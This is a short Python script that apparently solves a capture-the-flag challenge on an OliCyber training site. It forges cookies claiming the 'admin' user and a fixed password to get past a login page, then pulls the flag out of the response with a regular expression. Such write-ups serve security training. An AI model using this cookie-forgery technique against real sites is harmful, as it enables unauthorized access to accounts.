import requests
import re

site = "http://notalogin.challs.olicyber.it"

cookies = {
    "username" : "admin",
    "password" : "unguessable_password_123"
}
 
r = requests.get(site, cookies=cookies).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)